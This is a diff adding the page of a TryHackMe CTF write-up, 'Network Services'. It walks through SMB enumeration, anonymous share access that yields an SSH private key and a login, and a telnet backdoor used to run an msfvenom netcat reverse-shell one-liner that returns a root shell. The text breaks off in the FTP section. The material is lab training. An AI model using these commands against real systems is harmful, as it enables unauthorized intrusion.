@@ -1,0 +1,743 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Network Services | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,windows"><meta name=description content="Network Services TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/network-services/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/network-services/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Network Services"><meta property="og:description" content="Network Services TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/network-services/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Network Services"><meta name=twitter:description content="Network Services TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Network Services","item":"https://s4ch.github.io/writeups/tryhackme/network-services/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Network Services","name":"Network Services","description":"Network Services TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","windows"],"articleBody":"Learn about, then enumerate and exploit a variety of network services and misconfigurations.\nNetwork Services\n💢 We will cover the topics SMB Fundamentals SMB Enumeration SMB Exploitation Telnet Fundamentals Telnet Enumeration Telnet Exploitation FTP Fundamentals FTP Enumeration FTP Exploitation Task 1 Get Connected Hello and welcome!\nThis room will explore common Network Service vulnerabilities and misconfigurations, but in order to do that, we’ll need to do a few things first!\nA basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you’ll need some help with this, try completing the ‘Learn Linux’ room (https://tryhackme.com/room/zthlinux)\nConnect to the TryHackMe OpenVPN Server (See https://tryhackme.com/access for help!) Make sure you’re sitting comfortably, and have a cup of Tea, Coffee or Water close! Now, let’s move on!\nN.B. This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 (https://tryhackme.com/room/wifihacking101)\nReady? Let’s get going! No answer needed\nTask 2 Understanding SMB What is SMB?\nSMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [source]\nServers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.\nThe SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.\nHow does SMB work?\nOnce they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.\nWhat runs SMB?\nMicrosoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.\nWhat does SMB stand for? Server Message Block\nWhat type of protocol is SMB? response-request\nWhat do clients connect to servers using? TCP/IP\nWhat systems does Samba run on? Unix\nTask 3 Enumerating SMB Lets Get Started\nBefore we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!\nEnumeration\nEnumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.\nThis process is essential for an attack to be successful, as wasting time with exploits that either don’t work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.\nSMB\nTypically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you’d be surprised what is sometimes included on these shares.\nPort Scanning\nThe first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine. You can go as in depth as you like on this, however I suggest using nmap with the -A and -p- tags.\n-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one -p- : Enables scanning across all ports, not just the top 1000 If you’d like to learn more about nmap in more detail, I recommend checking out DarkStar’s room on the topic, as part of the Red Primer series here.\nEnum4Linux\nEnum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It’s installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.\nThe syntax of Enum4Linux is nice and simple: “enum4linux [options] ip”\nTAG FUNCTION -U get userlist -M get machine list -N get namelist dump (different from -U and-M) -S get sharelist -P get password policy information -G get group and member list -A all of the above (full basic enumeration) Now we understand our enumeration tools, lets get started!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -A -p- -sS -sC -sV -O 10.10.78.132 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-22 00:33 CEST Nmap scan report for 10.10.78.132 Host is up (0.038s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA) | 256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA) |_ 256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/22%OT=22%CT=1%CU=39565%PV=Y%DS=2%DC=T%G=Y%TM=5F90B7 OS:6B%P=x86_64-pc-linux-gnu)SEQ(SP=F3%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1 OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 0s |_nbstat: NetBIOS name: POLOSMB, NetBIOS user: , NetBIOS MAC: (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: polosmb | NetBIOS computer name: POLOSMB\\x00 | Domain name: \\x00 | FQDN: polosmb |_ System time: 2020-10-21T22:34:18+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-10-21T22:34:18 |_ start_date: N/A TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 36.96 ms 10.8.0.1 2 36.97 ms 10.10.78.132 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.23 seconds Conduct an nmap scan of your choosing, How many ports are open? 3\nWhat ports is SMB running on? 139/445\nLet’s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kali@kali:~/CTFs/tryhackme/Network Services$ enum4linux 10.10.78.132 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 22 00:36:05 2020 ========================== | Target Information | ========================== Target ........... 10.10.78.132 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.78.132 | ==================================================== [+] Got domain/workgroup name: WORKGROUP WORKGROUP\nWhat comes up as the name of the machine? POLOSMB\nWhat operating system version is running? 6.1\nWhat share sticks out as something we might want to investigate? 1 2 3 4 5 6 7 8 9 10 kali@kali:~/CTFs/tryhackme/Network Services$ smbclient -L //10.10.78.132 Enter WORKGROUP\\kali's password: Sharename Type Comment --------- ---- ------- netlogon Disk Network Logon Service profiles Disk Users profiles print$ Disk Printer Drivers IPC$ IPC IPC Service (polosmb server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available profiles\nTask 4 Exploiting SMB Types of SMB Exploit\nWhile there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you’re more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we’re going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.\nMethod Breakdown\nSo, from our enumeration stage, we know:\nThe SMB share location The name of an interesting SMB share SMBClient\nBecause we’re trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it’s part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.\nWe can remotely access the SMB share using the syntax:\n“smbclient //[IP]/[SHARE]”\nFollowed by the tags:\n-U [name] : to specify the user -p [port] : to specify the port Got it? Okay, let’s do this!\nWhat would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port? smbclient //10.10.10.2/secret -U suit -p 139\nGreat! Now you’ve got a hang of the syntax, let’s have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability. 1 2 3 4 kali@kali:~/CTFs/tryhackme/Network Services$ smbclient //10.10.78.132/profiles Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\\u003e No answer needed\nLets see if our interesting share has been configured to allow anonymous access, I.E it doesn’t require authentication to view the files. We can do this easily by: using the username “Anonymous” connecting to the share we found during the enumeration stage and not supplying a password. Does the share allow anonymous access? Y/N?\nY\nGreat! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 smb: \\\u003e ls . D 0 Tue Apr 21 13:08:23 2020 .. D 0 Tue Apr 21 12:49:56 2020 .cache DH 0 Tue Apr 21 13:08:23 2020 .profile H 807 Tue Apr 21 13:08:23 2020 .sudo_as_admin_successful H 0 Tue Apr 21 13:08:23 2020 .bash_logout H 220 Tue Apr 21 13:08:23 2020 .viminfo H 947 Tue Apr 21 13:08:23 2020 Working From Home Information.txt N 358 Tue Apr 21 13:08:23 2020 .ssh DH 0 Tue Apr 21 13:08:23 2020 .bashrc H 3771 Tue Apr 21 13:08:23 2020 .gnupg DH 0 Tue Apr 21 13:08:23 2020 12316808 blocks of size 1024. 7583776 blocks available smb: \\\u003e get \"Working From Home Information.txt\" getting file \\Working From Home Information.txt of size 358 as Working From Home Information.txt (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec) 1 2 3 4 5 6 7 8 9 10 11 12 13 kali@kali:~/CTFs/tryhackme/Network Services$ cat Working\\ From\\ Home\\ Information.txt John Cactus, As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever possible, employees should work from home. As such- your account has now been enabled with ssh access to the main server. If there are any problems, please contact the IT department at it@polointernalcoms.uk Regards, James Department Manager John Cactus\nWhat service has been configured to allow him to work from home? ssh\nOkay! Now we know this, what directory on the share should we look in? 1 2 3 4 5 6 7 8 9 10 smb: \\\u003e cd .ssh smb: \\.ssh\\\u003e ls . D 0 Tue Apr 21 13:08:23 2020 .. D 0 Tue Apr 21 13:08:23 2020 id_rsa A 1679 Tue Apr 21 13:08:23 2020 id_rsa.pub N 396 Tue Apr 21 13:08:23 2020 authorized_keys N 0 Tue Apr 21 13:08:23 2020 12316808 blocks of size 1024. 7584028 blocks available smb: \\.ssh\\\u003e .ssh\nThis directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us? id_rsa\nDownload this file to your local machine, and change the permissions to “600” using “chmod 600 [file]”. Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.\nWhat is the smb.txt flag?\n1 2 kali@kali:~/CTFs/tryhackme/Network Services$ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 kali@kali:~/CTFs/tryhackme/Network Services$ ssh -i id_rsa cactus@10.10.78.132 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Oct 21 22:57:37 UTC 2020 System load: 0.0 Processes: 93 Usage of /: 33.3% of 11.75GB Users logged in: 0 Memory usage: 17% IP address for eth0: 10.10.78.132 Swap usage: 0% 22 packages can be updated. 0 updates are security updates. Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110 cactus@polosmb:~$ ls smb.txt cactus@polosmb:~$ cat smb.txt THM{smb_is_fun_eh?} cactus@polosmb:~$ THM{smb_is_fun_eh?}\nTask 5 Understanding Telnet What is Telnet?\nTelnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that’s hosting a telnet server.\nThe telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.\nReplacement\nTelnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.\nHow does Telnet work?\nThe user connects to the server by using the Telnet protocol, which means entering “telnet” into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: “telnet [ip] [port]”\nWhat is Telnet? application protocol\nWhat has slowly replaced Telnet? SSH\nHow would you connect to a Telnet server with the IP 10.10.10.3 on port 23? telnet 10.10.10.3 23\nThe lack of what, means that all Telnet communication is in plaintext? encryption\nTask 6 Enumerating Telnet Lets Get Started\nBefore we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!\nEnumeration\nWe’ve already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don’t always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.\nPort Scanning\nLet’s start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.\nTag\n-A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one -p- : Enables scanning across all ports, not just the top 1000 Output\nLet’s see what’s going on on the target server…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 kali@kali:~/CTFs/tryhackme/Network Services$ sudo nmap -p- -sS -sC -sV -Pn -O 10.10.221.224 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 20:49 CET Nmap scan report for 10.10.221.224 Host is up (0.037s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 8012/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: |_ SKIDY'S BACKDOOR. Type .HELP to view commands 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8012-TCP:V=7.80%I=7%D=10/25%Time=5F95D704%P=x86_64-pc-linux-gnu%r(N SF:ULL,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20comman SF:ds\\n\")%r(GenericLines,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to SF:\\x20view\\x20commands\\n\")%r(GetRequest,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type SF:\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(HTTPOptions,2E,\"SKIDY'S\\x20B SF:ACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(RTSPRequest SF:,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\ SF:n\")%r(RPCCheck,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20vie SF:w\\x20commands\\n\")%r(DNSVersionBindReqTCP,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20T SF:ype\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(DNSStatusRequestTCP,2E,\"S SF:KIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r( SF:Help,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20comma SF:nds\\n\")%r(SSLSessionReq,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20 SF:to\\x20view\\x20commands\\n\")%r(TerminalServerCookie,2E,\"SKIDY'S\\x20BACKDO SF:OR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(TLSSessionReq,2E SF:,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\") SF:%r(Kerberos,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x SF:20commands\\n\")%r(SMBProgNeg,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP SF:\\x20to\\x20view\\x20commands\\n\")%r(X11Probe,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20 SF:Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(FourOhFourRequest,2E,\"SK SF:IDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(L SF:PDString,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20c SF:ommands\\n\")%r(LDAPSearchReq,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP SF:\\x20to\\x20view\\x20commands\\n\")%r(LDAPBindReq,2E,\"SKIDY'S\\x20BACKDOOR\\.\\ SF:x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(SIPOptions,2E,\"SKIDY' SF:S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20commands\\n\")%r(LANDe SF:sk-RC,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x20to\\x20view\\x20comm SF:ands\\n\")%r(TerminalServer,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x20\\.HELP\\x SF:20to\\x20view\\x20commands\\n\")%r(NCP,2E,\"SKIDY'S\\x20BACKDOOR\\.\\x20Type\\x2 SF:0\\.HELP\\x20to\\x20view\\x20commands\\n\"); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/25%OT=8012%CT=1%CU=38185%PV=Y%DS=2%DC=I%G=Y%TM=5F95 OS:D7AA%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A) OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508 OS:ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3) OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+% OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A= OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40 OS:%CD=S) Network Distance: 2 hops OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 209.59 seconds How many ports are open on the target machine? 1\nWhat port is this? 8012\nThis port is unassigned, but still lists the protocol it’s using, what protocol is this? tcp\nNow re-run the nmap scan, without the -p- tag, how many ports show up as open? 0\nHere, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It’s important to try every angle when enumerating, as the information you gather here will inform your exploitation stage. No answer needed\nBased on the title returned to us, what do we think this port could be used for? A Backdoor\nWho could it belong to? Gathering possible usernames is an important step in enumeration. SKIDY\nAlways keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits. Task 7 Exploiting Telnet Types of Telnet Exploit\nTelnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE’s for Telnet client and server systems, however, so when exploiting you can check for those on:\nhttps://www.cvedetails.com/ https://cve.mitre.org/ A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.\nHowever, you’re far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.\nMethod Breakdown\nSo, from our enumeration stage, we know:\nThere is a poorly hidden telnet service running on this machine The service itself is marked “backdoor” We have possible username of “Skidy” implicated Using this information, let’s try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!\nConnecting to Telnet\nYou can connect to a telnet server with the following syntax: “telnet [ip] [port]”\nWe’re going to need to keep this in mind as we try and exploit this machine.\nWhat is a Reverse Shell?\nA “shell” can simply be described as a piece of code or program which can be used to gain code or command execution on a device.\nA reverse shell is a type of shell in which the target machine communicates back to the attacking machine.\nThe attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.\nOkay, let’s try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above. No answer needed\nGreat! It’s an open telnet connection! What welcome message do we receive? 1 2 3 4 5 kali@kali:~/CTFs/tryhackme/Network Services$ telnet 10.10.221.224 8012 Trying 10.10.221.224... Connected to 10.10.221.224. Escape character is '^]'. SKIDY'S BACKDOOR. Type .HELP to view commands SKIDY'S BACKDOOR.\nLet’s try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) N\nHmm… that’s strange. Let’s check to see if what we’re typing is being executed as a system command. No answer needed\nStart a tcpdump listener on your local machine using: “sudo tcpdump ip proto \\icmp -i tun0” This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on. No answer needed\nNow, use the command “ping [local tun0 ip] -c 1” through the telnet session to see if we’re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) 1 2 3 4 5 6 7 kali@kali:~/CTFs/tryhackme/Network Services$ ping 10.8.106.222 -c 1 PING 10.8.106.222 (10.8.106.222) 56(84) bytes of data. 64 bytes from 10.8.106.222: icmp_seq=1 ttl=64 time=0.027 ms --- 10.8.106.222 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let’s have some fun! We’re going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here’s our syntax: “msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R” -p = payload lhost = our local host IP address lport = the port to listen on R = export the payload in raw format What word does the generated payload start with?\n1 2 3 4 5 6 kali@kali:~/CTFs/tryhackme/Network Services$ msfvenom -p cmd/unix/reverse_netcat lhost=10.8.106.222 lport=4444 R [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 102 bytes mkfifo /tmp/itxhqvx; nc 10.8.106.222 4444 0\u003c/tmp/itxhqvx | /bin/sh \u003e/tmp/itxhqvx 2\u003e\u00261; rm /tmp/itxhqvx mkfifo\nPerfect. We’re nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using: “nc -lvp [listening port]” What would the command look like for the listening port we selected in our payload? 1 2 kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444 Listening on 0.0.0.0 4444 nc -lvp 4444\nGreat! Now that’s running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine! 1 .RUN mkfifo /tmp/itxhqvx; nc 10.8.106.222 4444 0/tmp/itxhqvx 2\u003e\u00261; rm /tmp/itxhqvx No answer needed\nSuccess! What is the contents of flag.txt? 1 2 3 4 5 6 7 8 9 kali@kali:~/CTFs/tryhackme/Network Services$ nc -lvp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.221.224 56944 id uid=0(root) gid=0(root) groups=0(root) ls flag.txt cat flag.txt THM{y0u_g0t_th3_t3ln3t_fl4g} THM{y0u_g0t_th3_t3ln3t_fl4g}\nTask 8 Understanding FTP What is FTP?\nFile Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we’ll come on to later- relays commands and data in a very efficient way.\nHow does FTP work?\nA typical FTP session operates using two channels:\na command (sometimes called the control) channel a data channel. As their names imply, the command channel is used for transmitting 